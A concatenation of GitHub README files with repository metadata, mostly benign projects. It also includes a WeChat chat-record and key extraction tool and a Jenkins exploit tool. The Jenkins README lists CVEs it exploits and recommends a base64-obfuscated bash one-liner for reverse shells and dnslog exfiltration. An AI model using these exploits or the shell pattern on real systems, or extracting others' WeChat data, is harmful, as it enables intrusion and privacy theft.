    <a href=""https://github.com/xuchengsheng""><img src=""https://img.shields.io/github/followers/xuchengsheng?label=Followers&logo=github&logoColor=%23FC521F&labelColor=%231A2477&color=%23FC521F&cacheSeconds=3600"" alt=""Follow Badge""></a>
    <a href=""https://github.com/xuchengsheng/wx-dump-4j/fork""><img src=""https://img.shields.io/github/forks/xuchengsheng/wx-dump-4j?label=Forks&logo=github&logoColor=%23F2BB13&labelColor=%23BE2323&color=%23F2BB13"" alt=""Fork Badge""></a>
    <a href=""https://github.com/xuchengsheng/wx-dump-4j/watchers""><img src=""https://img.shields.io/github/watchers/xuchengsheng/wx-dump-4j?label=Watchers&logo=github&logoColor=%23FF4655&labelColor=%234169E1&color=%23FF4655&cacheSeconds=3600"" alt=""Watchers Badge""></a> 
</p>

<p align=""center"">
	<img src=""https://img.shields.io/badge/Java-11%2B-%23437291?logo=openjdk&logoColor=%23437291""/>
    <img src=""https://img.shields.io/badge/Spring-5.3.10-%23437291?logo=Spring&logoColor=%236DB33F&color=%236DB33F""/>
    <img src=""https://img.shields.io/badge/SpringBoot-2.5.5-%23437291?logo=SpringBoot&logoColor=%236DB33F&color=%236DB33F""/>
    <img src=""https://img.shields.io/badge/JNA-5.8.0-%23437291?logo=JNA&logoColor=%23228B22&color=%23228B22""/>
    <img src=""https://img.shields.io/badge/Hutool-5.8.16-%23437291?logo=JNA&logoColor=%23F08080&color=%23F08080""/>
    <img src=""https://img.shields.io/badge/easyexcel-5.8.16-%23437291?logo=JNA&logoColor=%23D2691E&color=%23D2691E""/>
    <img src=""https://img.shields.io/badge/protobuf-3.25.1-%23437291?logo=JNA&logoColor=%23800080&color=%23800080""/>
    <img src=""https://img.shields.io/badge/mapstruct-1.4.2-%23437291?logo=JNA&logoColor=%23DC143C&color=%23DC143C""/>
    <img src=""https://img.shields.io/badge/druid-1.2.20-%23437291?logo=JNA&logoColor=%23C71585&color=%23C71585""/>
    <img src=""https://img.shields.io/badge/mybatisPlus-3.5.4.1-%23437291?logo=JNA&logoColor=%234B0082&color=%234B0082""/>
    <img src=""https://img.shields.io/badge/sqlite-3.34.0-%23437291?logo=JNA&logoColor=%230000CD&color=%230000CD""/>
    <img src=""https://img.shields.io/badge/lombok-1.18.20-%23437291?logo=JNA&logoColor=%23008B8B&color=%23008B8B""/>
</p>

-------------------------------------------------------------------------------

## 📚 简介

wx-dump-4j是一款基于Java开发的微信数据分析工具。它准确显示好友数、群聊数和当日消息总量，提供过去15天每日消息统计，了解社交活跃度。识别展示最近一个月内互动频繁的前10位联系人。支持导出聊天记录、联系人、群聊信息，及查看**超过三天限制的朋友圈**历史记录和**找回微信好友**。

## 💡 主要功能

- 👤 **获取用户信息**：获取当前登录微信的详细信息，包括昵称、账号、手机号、邮箱、秘钥、微信Id。
- 💬 **支持多种消息类型**：管理微信聊天对话中的文本、引用、图片、表情、卡片链接、系统消息等。
- 📊 **综合管理**：提供微信会话、联系人、群聊与朋友圈的全面管理功能。
- 📥 **记录导出**：支持导出微信聊天记录、联系人、已删除好友和群聊信息，便于备份和管理。
- 📅 **查看历史朋友圈**：突破三日限制，查看更久以前的朋友圈历史记录，方便回顾和管理。
- 📈 **微信统计功能**：展示微信好友数、群聊数及今日收发消息总量，了解社交活跃度。
- 📊 **消息统计**：统计过去15天内每日微信消息数量，掌握长期消息交流情况。
- 🔝 **互动联系人**：展示最近一个月互动最频繁的前10位联系人，了解重要社交联系。
- 🧩 **消息类别占比**：展示微信消息类别占比图表，分析不同类型消息的占比情况。
- ☁️ **关键字词云**：展示微信最近使用的关键字词云图，分析聊天内容重点。
- 🔄 **找回已删除好友**：支持找回已删除的微信好友，恢复重要联系人。
- 🖥️ **微信多开支持**：支持微信多开功能，方便管理多个账号，提高效率。

## 🚀 快速启动

本指南将帮助您快速启动并运行项目，无论是安装包部署还是本地部署。

### 环境准备

在开始之前，请确保您的开发环境满足以下要求：

- 安装 [Java](https://repo.huaweicloud.com/java/jdk/11.0.2+9/jdk-11.0.2_windows-x64_bin.exe)，版本为 JDK 11+。
- 安装 [Node.js](https://nodejs.org/en/)，版本为 18+。
- 安装 [Maven](https://maven.apache.org/download.cgi)，版本为 3.5.0+。
- 选择一款开发工具，比如 IntelliJ IDEA。

### 二进制部署

- 点击下载最新版 [wx-dump-4j-bin.tar.gz](https://github.com/xuchengsheng/wx-dump-4j/releases/download/v1.1.0/wx-dump-4j-bin.tar.gz)。

- 解压缩 `wx-dump-4j-bin.tar.gz` 文件，并进入 `bin` 目录。

- 双击 `start.bat` 启动文件。

- 启动成功后，在浏览器中访问 [http://localhost:8080](http://localhost:8080) 以查看应用。

### 本地部署

- 下载源码：
   ```bash
   $ git clone https://github.com/xuchengsheng/wx-dump-4j.git
   ```
- 安装后端依赖：
   ```bash
   $ cd wx-dump-4j mvn clean install
   ```
- 使用开发工具（如 IntelliJ IDEA）启动 com.xcs.wx.WxDumpApplication。
- 安装前端依赖：
   ```bash
   $ cd wx-dump-ui npm install
   ```
- 启动前端服务：
   ```bash
   $ npm run start
   ```
- 前端服务启动成功后，在浏览器中访问 http://localhost:8000 以查看应用。

## ⚡ 技术栈
以下是本项目使用的技术栈：

| 技术         | 描述                      | 版本      |
|--------------|---------------------------|-----------|
| Spring Boot  | Web 和 Thymeleaf 框架     | 2.7.15    |
| SQLite       | 轻量级数据库              | 3.34.0    |
| Lombok       | 简化 Java 代码            | 1.18.20   |
| MyBatis Plus | ORM 框架扩展              | 3.5.4.1   |
| Dynamic Datasource | 动态数据源管理         | 4.2.0     |
| Druid        | 数据库连接池              | 1.2.20    |
| MapStruct    | Java Bean 映射工具        | 1.4.2.Final |
| Hutool       | Java 工具库               | 5.8.16    |
| JNA          | Java 本地访问             | 5.8.0     |
| Protobuf     | 序列化框架                | 3.25.1    |
| gRPC         | RPC 框架                  | 1.11.0    |
| EasyExcel    | Excel 操作工具            | 3.3.3     |
| Commons Compress | 压缩和解压缩工具    | 1.19      |
| Jackson Dataformat XML | XML 解析工具  | 2.13.5    |
| Commons Lang3 | 常用工具类库             | 3.12.0    |

## ⛔️️ 使用限制
本软件仅适用于Windows操作系统。我们目前不支持macOS、Linux或其他操作系统。如果你在尝试在非Windows系统上运行本软件时可能遇到兼容性问题，这些问题可能导致软件无法正常运行或产生其他意外后果。

| 操作系统 | 支持情况     |
|:--------:|:----------:|
| Windows  | 支持   |
| macOS    | 不支持     |
| Linux    | 不支持    |

## ⚠️免责声明

本软件仅供技术研究和教育目的使用，旨在解密用户个人微信聊天记录。严禁将本软件用于任何非法目的，包括但不限于侵犯隐私权或非授权数据访问。作为软件开发者，我不对因使用或滥用本软件产生的任何形式的损失或损害承担责任。

## ⛵欢迎贡献！

如果你发现任何错误🔍或者有改进建议🛠️，欢迎提交 issue 或者 pull request。你的反馈📢对于我非常宝贵💎！

## 💻我的 GitHub 统计

[![Star History Chart](https://api.star-history.com/svg?repos=xuchengsheng/wx-dump-4j&type=Date)](https://star-history.com/#xuchengsheng/wx-dump-4j&Date)

## 🎉Stargazers

[![Stargazers123 repo roster for @xuchengsheng/wx-dump-4j](https://reporoster.com/stars/xuchengsheng/wx-dump-4j)](https://github.com/xuchengsheng/wx-dump-4j/stargazers)

## 🎉Forkers

[![Forkers repo roster for @xuchengsheng/wx-dump-4j](https://reporoster.com/forks/xuchengsheng/wx-dump-4j)](https://github.com/xuchengsheng/wx-dump-4j/network/members)

## 🍱请我吃盒饭？

作者晚上还要写博客✍️,平时还需要工作💼,如果帮到了你可以请作者吃个盒饭🥡
<div>
<img alt=""logo"" src=""image/WeChatPay.png"" style=""width: 240px;height: 260px"">
<img alt=""logo"" src=""image/Alipay.png"" style=""width: 240px;height: 260px"">
</div>

## ⭐️扫码关注微信公众号

关注后，回复关键字📲 **加群**📲，即可加入我们的技术交流群，与更多开发者一起交流学习。

在此，我们真诚地邀请您访问我们的GitHub项目页面，如果您觉得***wx-dump-4j***对您有帮助，请顺手点个⭐️**Star**⭐️！每一颗星星都是我们前进的动力，是对我们努力的最大肯定。非常感谢您的支持！

<div>
<img alt=""logo"" src=""image/wechat-mp.png"" height=""180px"">>
</div>

## 👀 演示图

<table>
    <tr>
        <td><img src=""image/screenshot/dashboard.png""/></td>
        <td><img src=""image/screenshot/session.png""/></td>
    </tr>
    <tr>
        <td><img src=""image/screenshot/contact.png""/></td>
        <td><img src=""image/screenshot/recover-contact.png""/></td>
    </tr>
    <tr>
        <td><img src=""image/screenshot/feeds.png""/></td>
        <td><img src=""image/screenshot/chat.png""/></td>
    </tr>
	<tr>
        <td><img src=""image/screenshot/chatroom.png""/></td>
        <td><img src=""image/screenshot/chatroom-detail.png""/></td>
    </tr>	 
	<tr>
        <td><img src=""image/screenshot/database.png""/></td>
        <td><img src=""image/screenshot/database-list.png""/></td>
    </tr>
</table>",2,30,1,MIT
dromara/warm-flow,master,"<p align=""center"">
	<img alt=""logo"" src=""https://foruda.gitee.com/images/1726820610127990120/c8c5f3a4_2218307.png"" width=""100"">
</p>
<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">Warm-Flow工作流</h1>
<p align=""center"">
	<a href=""https://gitee.com/dromara/warm-flow/stargazers""><img src=""https://gitee.com/dromara/warm-flow/badge/star.svg?theme=dark""></a>
        <a href='https://gitee.com/dromara/warm-flow/members'><img src='https://gitee.com/dromara/warm-flow/badge/fork.svg?theme=dark' alt='fork'> 
        </img></a>
</p>



## 介绍

Warm-Flow国产工作流引擎🎉，其特点简洁轻量，五脏俱全，可扩展，是一个可通过jar引入设计器的工作流。

1. 简洁易用：只有7张表，代码量少，可快速上手和集成
2. 审批功能：支持通过、退回、任意跳转、转办、终止、会签、票签、委派和加减签、互斥和并行网关
3. 监听器与流程变量：支持四种监听器，可应对不同场景，灵活可扩展，参数传递，动态权限
4. 流程图：流程引擎自带流程图，可在不集成流程设计器情况下使用
5. 流程设计器：可通过jar包形式快速集成到项目，减少繁琐代码搬运和适配
6. 条件表达式：内置常见的和spel条件表达式，并且支持自定义扩展
7. 办理人变量表达式：内置${handler}和spel格式的表达式，可满足不同场景，灵活可扩展
8. orm框架扩展：目前支持MyBatis、Mybatis-Plus、Mybatis-Flex和Jpa，后续会由社区提供其他支持，扩展方便
9. 数据库支持：目前支持MySQL 、Oracle 和PostgreSQL，后续会继续支持其他数据库或者国产数据库
10. 多租户与软删除：流程引擎自身维护多租户和软删除实现，也可使用对应orm框架的实现方式
11. 同时支持spring和solon
12. 兼容java8和java17,理论11也可以
13. 官方提供基于ruoyi-vue封装实战项目，很实用

```shell
希望一键三连，你的⭐️ Star ⭐️是我持续开发的动力，项目也活的更长
```

>   **[github地址](https://github.com/dromara/warm-flow.git)** | **[gitee地址](https://gitee.com/dromara/warm-flow.git)** | **[gitCode地址](https://gitcode.com/dromara/warm-flow)**

## 演示地址

- admin/admin123

演示地址：http://www.hhzai.top

## 使用文档与联系方式

http://warm-flow.cn

## 组件所需脚本

- 首次导入，先创建数据库，找到对应数据库的全量脚本[warm-flow-all.sql](https://gitee.com/dromara/warm-flow/tree/master/sql/mysql)，执行
- 如果版本更新，找到对应数据库的更新版本，比如xx-upgrade，[warm-flow_x.x.x.sql](https://gitee.com/dromara/warm-flow/tree/master/sql/mysql/v1-upgrade)，执行

## 官网流程定义案例xml

[官网流程定义案例xml](https://gitee.com/dromara/warm-flow-test/tree/master/warm-flow-core-test/src/main/resources)

## 测试代码

> 测试代码[warm-flow-test](https://gitee.com/dromara/warm-flow-test)项目中，warm-flow-xxx-test模块的测类

## 支持数据库类型

* [x] mysql
* [x] oracle
* [x] postgresql
* [ ] 达梦
* [ ] 人大金仓
* [ ] GaussDB
* [ ] oceanbase
* [ ] sqlserver
* [ ] ......

## orm扩展包

* [x] mybatis
* [x] mybatis-plus
* [x] jpa
* [x] mybatis-flex
* [x] easy-query
* [ ] ......




> **有想扩展其他orm框架和数据库的可加qq群联系群主**


## 推荐

大家在使用本项目时，推荐结合贺波老师的书
[《深入Flowable流程引擎：核心原理与高阶实战》](https://item.jd.com/14804836.html)学习。这本书得到了Flowable创始人Tijs Rademakers亲笔作序推荐，对系统学习和深入掌握Flowable的用法非常有帮助。

<img src=""https://gitee.com/cai_xiao_feng/lowflow-design/raw/main/public%2Fflowable.jpg"" width=""500px""/>

## 你可以请作者喝杯咖啡表示鼓励

![输入图片说明](https://foruda.gitee.com/images/1697770422557390406/7efa04d6_2218307.png ""屏幕截图"")

## 特别感谢JetBrains对开源项目支持


<a href=""https://jb.gg/OpenSourceSupport"">
  <img src=""https://user-images.githubusercontent.com/8643542/160519107-199319dc-e1cf-4079-94b7-01b6b8d23aa6.png"" align=""left"" height=""100"" width=""100""  alt=""JetBrains"">
</a>
<br>
<br>
<br>


## git提交规范

    [init] 初始化  
    [feat] 增加新功能  
    [fix] 修复问题/BUG  
    [perf] 优化/性能提升  
    [refactor] 重构  
    [revert] 撤销修改  
    [style] 代码风格相关无影响运行结果的  
    [update] 其他修改  
    [upgrade] 升级版本  
    
",4,0,10,Apache-2.0
Incendo/cloud-minecraft,master,"<div align=""center"">
<img src=""https://github.com/Incendo/cloud/raw/master/img/CloudNew.png"" width=""300px""/>
<br/>
<h1>cloud-minecraft</h1>

![license](https://img.shields.io/github/license/incendo/cloud.svg)
[![central](https://img.shields.io/maven-central/v/org.incendo/cloud-paper)](https://search.maven.org/search?q=org.incendo)
![build](https://img.shields.io/github/actions/workflow/status/incendo/cloud-minecraft/build.yml?logo=github)
[![docs](https://img.shields.io/readthedocs/incendocloud?logo=readthedocs)](https://cloud.incendo.org)
</div>

## links

- JavaDoc: https://javadoc.io/doc/org.incendo
- Docs: https://cloud.incendo.org/minecraft
- Incendo Discord: https://discord.gg/aykZu32

## modules

- cloud-brigadier: integration with [Mojang Brigadier](https://github.com/Mojang/brigadier)
- cloud-paper: integration for Bukkit-based platforms with specific support for [Paper API](https://papermc.io/software/paper)
- cloud-bukkit: integration for Bukkit-based platforms, dependency of cloud-paper
- cloud-velocity: integration for [Velocity API](https://papermc.io/software/velocity)
- cloud-sponge7: integration for [Sponge API](https://spongepowered.org) v7
- cloud-bungee: integration for Bungeecord API
- cloud-cloudburst: integration for cloudburst
- cloud-minecraft-extras: optional extras using [adventure](https://github.com/KyoriPowered/adventure) API
- cloud-minecraft-bom: [bill of materials](https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Importing_Dependencies) for cloud-minecraft dependencies
",10,7,8,MIT
StandardSolvers/ps-code-snippets,main,"![logo](./docs/img/logo.png)


<div align=""center"">
    <a href=""https://www.apache.org/licenses/LICENSE-2.0""><img src=""https://img.shields.io/badge/license-Apache2-green.svg?style=for-the-badge"" alt=""Apache2""></a>
    <img src=""https://img.shields.io/maintenance/yes/2024?style=for-the-badge"" alt=""Maintenance"">
    <a href=""https://github.com/StandardSolvers/ps-code-snippets/graphs/contributors""><img src=""https://img.shields.io/github/contributors/StandardSolvers/ps-code-snippets?style=for-the-badge"" alt=""GitHub contributors""></a>
    <a href=""https://github.com/StandardSolvers/ps-code-snippets/contribute""><img src=""https://img.shields.io/github/issues/StandardSolvers/ps-code-snippets/good%20first%20issue?style=for-the-badge"" alt=""GitHub issues by-label""></a>        
</div>

# Problem Solving Code Snippets
- Unlock the potential of your code with the Algorithm Codesnippet.
- A unique and creative rendering of standard solvers' algorithms, showcasing the beauty and complexity of coding!

# Getting Started
## IntelliJ

# Contributing
- Contributing to ps-code-snippets is very welcome. For basic contributions, all you need is being comfortable with GitHub and Git.
- The best ways to contribute are:
    - Work on new Algorithm (Ps, Statement pair set)
    - Work on documentation
- To ensure equal and positive communication, we adhere to our [Code of Conduct](./CODE_OF_CONDUCT.md). Before starting any interactions with this repository, please read it and make sure to follow.
- Please before contributing check out our [Contributing Guide](./CONTRIBUTING.md) and issues labeled ""good first issue"": [![GitHub issues by-label](https://img.shields.io/github/issues/StandardSolvers/ps-code-snippets/good%20first%20issue?style=for-the-badge)](https://github.com/StandardSolvers/ps-code-snippets/contribute)
<br>

# Features
- Take exactly what's written in the code

![gif](./docs/img/disjoint-set.gif)

# Model
- intellij
    - completion
        - PsCompletionContributor
        - PsCompletionProvider
    - action
        - PsPopUp
    - DialogWrapper
        - PsDailogWrapper
- core
  - PsManager
  - PsProvider
- solution
  - ps
  - statement

## UML: Class Diagram
![uml](./docs/img/uml.png)




",1,0,7,Apache-2.0
longerye/im-chat,master,"brief introduction:
    I have always had a social dream, I want to do an IM application, I have seen a lot of excellent
  open source projects, but there is no suitable for myself. So I used my break time to write such a system.
    IM-chat is a web version of chat software implemented in imitation of wechat, which is currently completely open source.
  Support private chat, group chat, offline message, send voice, pictures, files, emojis and other functions
  Video chat support (based on webrtc implementation, ssl certificate required) The backend uses springboot+netty,
  and the web uses vue Servers support cluster deployment, and each im-server processes only the messages of its own connected users
    Technology stack:
        Back-end frameworks: Springboot, Netty, Mybatis-plus, Swagger, Jwt
        Technical components: Mysql, Redis, Minio
        Front-end technology: Vue, Eelement-ui, Webrtc",0,0,4,MIT
carldea/windowblur,main,"# windowblur
A JavaFX/Java to Objective C bridge library to natively use the Windows background blur effect on MacOS
",0,1,1,
nkuhn-vmw/GenAI-for-TPCF-Samples,main,"# GenAI for Tanzu Platform for Cloud Foundry: Application Samples

This repo is designed to hold applications written to demo the new GenAI for TPCF tile.

[See Product Page to Sign Up for the Beta](https://tanzu.vmware.com/application-service/private-ai) for GenAI for TAS. A team member will reach out and schedule a call to get you on-boarded in the beta program.

See example Applications below:

1. [Gradio Chat](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/gradio-chat) This is the sample chat application from fastchat modified to use GenAI for TAS as the backend LLM.

2. [Spring Metal](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/spring-metal) A modifed version of the classic ""Spring Music"" Cloud Foundry application infused with magic from the new [Spring AI project](https://github.com/spring-projects/spring-ai). This app will add a ""Spring Music Assistant"" when the GenAI for TAS service is bound to this application.

3. [openweb-ui-cf](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/openweb-ui-cf) The ever popular openweb ui frontend with TPCF deployment options and examples for GenAI for TPCF.

4. [acme-fitness](https://github.com/spring-cloud-services-samples/acme-fitness-store) This represents a fictional e-commerce store running multiple microservices and a new acme-assist microservice to provide a curated chatbot experience to assist customers in their shopping experience.


",0,0,1,
PaperMC/SectorTool,master,"# SectorTool

SectorTool primarily performs conversion and deconversion of worlds from/to
the SectorFile format. It can also perform benchmarks or other analysis of
RegionFiles.

It's highly recommended to only use this tool on **COPIES** of worlds.

The test branch does not contain any conversion code, you **MUST** use this tool
to convert.

This tool does not attempt to fix errors in RegionFiles. Make sure your world
has no errors in your RegionFiles before converting.

SectorTool can perform one of these operations:
1. [Convert to SectorFile](#conversion-to-sectorfile-from-regionfile)
2. [Deconvert from SectorFile](#conversion-from-sectorfile-to-regionfile-deconversion)
3. [Verify consistency from RegionFile to SectorFile](#verification-test)
4. [Perform compression tests on RegionFiles](#compression-test)
5. [Read results from compression tests](#read-compression-test)
6. [Analyse sector allocation for RegionFiles](#analyse-regionfiles)

See [the specification](SPECIFICATION.MD) for exact details on the SectorFile
format.

## World Layout

Described are the folder layouts of world data in Vanilla and Bukkit.

### Vanilla

Vanilla has the overworld under the `world` directory, with its data being placed
directly in the `world` folder. The nether's data is placed under `world/DIM-1`,
the end's data is placed under `world/DIM1`.

### Bukkit (Spigot/Paper/Folia)

If you run Bukkit, Spigot, Paper, or Folia your worlds are formatted in the ""Bukkit""
layout. The Bukkit layout places the overworld in the `world` folder in the root
server directory. The nether is placed in the `world_nether` folder in the root
server directory, however its data (excluding level.dat and friends) is placed
under `world_nether/DIM-1`, similar to how Vanilla would store under `world/DIM-1`.
The end is placed in the `world_the_end` folder in the root server directory, 
with its data being stored in `world_the_end/DIM1`.

### Changes

Instead of data being stored under `entities`, `poi`, and `region` data will
only be stored under the `sectors` directory. SectorFiles contain entities, 
poi, and region data under one SectorFile rather than multiple RegionFiles.

## Primary Usages

### Conversion to SectorFile from RegionFile

Converts a single world to the SectorFile format. The old RegionFiles
will not be deleted (folders: entities, poi, region), it is recommended 
that you move them after conversion. By moving the old data once you have
converted, it will be easier to convert back to RegionFile.

#### Behavior for already converted worlds

Additionally, there are no checks in-place to detect worlds already converted. 
Conversion will simply write the data found in the RegionFiles to the SectorFiles,
so if the SectorFiles have additional data for chunks not present in the original
RegionFiles they will be unaffected - but the chunks present in the RegionFiles
will be copied.

If you do not want this merging behavior then delete the `sectors` folder.

#### Command and options

```shell
java -Dop=conv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the 
root world directory. For Bukkit worlds, you will want to run the tool for 
each dimension, using the root world directory as input (i.e. point to 
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the new SectorFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)
* COPY (id = -1)

DEFLATE (id = 2) is the current default. LZ4 (id = 4) is fast but not space 
efficient. ZSTD (id = 5) is fast and slightly less space efficient than DEFLATE.

The COPY compression type will copy the compressed data from the source 
RegionFiles. Note that the COPY compression type will not perform 
decompression/recompression, unlike the rest of the compression options, 
which should greatly reduce CPU load.


### Conversion from SectorFile to RegionFile (Deconversion)

Converts a world from SectorFile format back to RegionFile format. It is 
highly recommended that you ensure that no RegionFiles are in the current world
(just move them to a separate directory), as the original conversion process from
RegionFile to SectorFile done by this tool **WILL NOT** delete RegionFiles. Note 
that the converted SectorFiles will not be deleted, you will need to do that.

#### Command and options

```shell
java -Dop=deconv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the RegionFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)

DEFLATE (id = 2) is the current default for Vanilla. LZ4 (id = 4) is 
**NOT** supported outside the latest snapshot, so do **NOT** use LZ4 
unless it is **FOR** snapshot worlds.

Note that ZSTD is not present because Vanilla RegionFile does not support ZSTD.

### Verification Test

Verifies that all data contained in the RegionFiles are contained in
the SectorFiles. This will not detect extra data in the SectorFiles.

#### Command and options

```shell
java -Dop=verify \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress (required but unused, pick one)

Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)

## Secondary Usages

### Compression Test

Performs compression tests (time to decompress, compress, and resulting 
compression ratios) and store the results in a file which may be later 
used by the [Compression Read](#read-compression-test) operation.

```shell
java -Dop=test \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Doutput=""<output>"" \
 -Dmax_regions=<max regions> \
 -jar sectortool.jar
```

#### input

Input directory of RegionFiles to run tests on. This is not a world directory,
it is a directory containing `.mca` files.

#### output

File to store test results in. This file should not exist, the tool will exit
if it does.

#### max_regions (optional)

The maximum number of RegionFiles to test on. Defaults to infinity.

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.


### Read Compression Test

Reads result file from a compression test, converting the data to some 
summary stats printed to stdout as well as converting the results to raw data
printed to `results.psv` in the working directory.


```shell
java -Dop=read \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### input

Results file generated by the compression test.

### Analyse RegionFiles

Computes the total number of 4096 byte sectors used by RegionFiles on disk 
(""file sectors""), the number of 4096 byte sectors allocated to live data by 
RegionFiles on disk (""allocated sectors""), the theoretical number of 512 byte 
sectors allocated (""alternate allocated sectors""), the total size of compressed 
data in bytes (""total data size""), and the number of obvious (header offsets/length
are invalid or point outside of file) errors in RegionFile headers (""errors"").

Computing `allocated sectors / file sectors` gives some indication of RegionFile
fragmentation.

Computing `allocated sectors / alternate allocated sectors * (4096/512)` gives
some indication of the improvements expected to come by using SectorFile.

#### Command and options

```shell
java -Dop=analyse \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.",4,1,1,
soundvibe/ha-danfoss,main,"<div align=""center"">
<h1>Danfoss Icon Controller Add-on</h1>
</div>



## General

This add-on connects to Danfoss Icon Master Controller and controls its exposed thermostats.

## Installation

Add the repository URL under **Supervisor (Hass.io) → Add-on Store** in your Home Assistant front-end:

    https://github.com/soundvibe/ha-danfoss

## Documentation

Addon README could be found [here](danfoss-addon/README.md).

## Donations

If this repository was useful to you and if you are willing to pay for it, feel free to send any amount through paypal:

[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://paypal.me/soundvibe)

",2,3,3,
B-Rajagopalan/CodingAtti-YouTube,main,"# CodingAtti-YouTube
Please check the playlist name and browse accordingly.
",0,0,1,
zzyybs/cloud2024,master,"微服务springcloud第3季当堂代码2024.1
",0,0,1,
TheBeastofwar/JenkinsExploit-GUI,master,"# JenkinsExploit-GUI

![JenkinsExploit-GUI](https://socialify.git.ci/TheBeastofwar/JenkinsExploit-GUI/image?description=1&forks=1&issues=1&language=1&name=1&owner=1&stargazers=1&theme=Light)

一款Jenkins综合漏洞利用工具
## 使用
### jdk版本
在windows或linux使用jdk8的哪一个版本应该都可以,在macOS里如果出现了找不到主类的错误,可能是因为当前java版本没有jfxrt.jar包,可以把这个jar包放在类似F:\java8\jdk1.8.0_102\jre\lib\ext这样的目录下
jfxrt.jar包在JenkinsExploit-GUI项目源码中可以单独下载下来
### 外置payload
从release下载windows_tools,linux_tools或macOS_tools并放在与JenkinsExploit-GUI-*-SNAPSHOT.jar相同的目录,或者可以自行打包tools_source中的python源码文件

如果是linux或macOS的话需要对外置payload进行chmod +x 赋予权限
![img.png](img/img.png)
![img_1.png](img/img_1.png)
### dnslog配置
进行dnslog设置,目前仅支持dnslog.pw和ceye.io

![img_3.png](img/img_3.png)
![img_4.png](img/img_4.png)
### 进行检测
![img_2.png](img/img_2.png)
* 在验证无回显命令执行的时候为了避免转义问题,推荐用如下方式进行反弹shell和dnslog外带信息
```
bash -c {echo,Y....}|{base64,-d}|{bash,-i}
```
## 支持检测:
- CVE-2015-8103/CVE-2016-0788 Jenkins 反序列化远程代码执行 https://github.com/Medicean/VulApps/tree/master/j/jenkins/1
- CVE-2016-0792 Jenkins XStream反序列化远程代码执行 https://github.com/jpiechowka/jenkins-cve-2016-0792
- CVE-2017-1000353 Jenkins-CI 远程代码执行漏洞 https://github.com/vulhub/CVE-2017-1000353
- CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露
- CVE-2018-1000861 Jenkins 绕过Groovy沙盒未授权命令执行漏洞 https://github.com/orangetw/awesome-jenkins-rce-2019
- CVE-2018-1999002 Jenkins 任意文件读取 https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w
- CVE-2019-1003000 Jenkins 远程代码执行 https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
- CVE-2019-1003005/CVE-2019-1003029 远程代码执行(Script Security Plugin沙箱绕过) https://github.com/orangetw/awesome-jenkins-rce-2019
- CVE-2024-23897 Jenkins CLI 接口任意文件读取漏洞 https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897
## 未完待续:
- CVE-2016-9299 Jenkins ldap反序列化远程代码执行,添加poc
- CVE-2017-1000353 无法检测的bug
- 继续尝试把外置的payload接入到java代码中
- 添加批量检测功能
## 源码打包
```
mvn clean package -DskipTests
cd target
zip -d  JenkinsExploit-GUI-*-SNAPSHOT.jar 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*DSA'
```
## Bug反馈
https://github.com/thebeastofwar/JenkinsExploit-GUI 提交issues
## 文章
[红队武器化开发:jenkins综合漏洞利用工具----JenkinsExploit-GUI](https://www.cnblogs.com/thebeastofwar/p/17991690)
## 免责声明
本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。
在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**
如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。
在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。
除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
## 开发日志
### v1.0
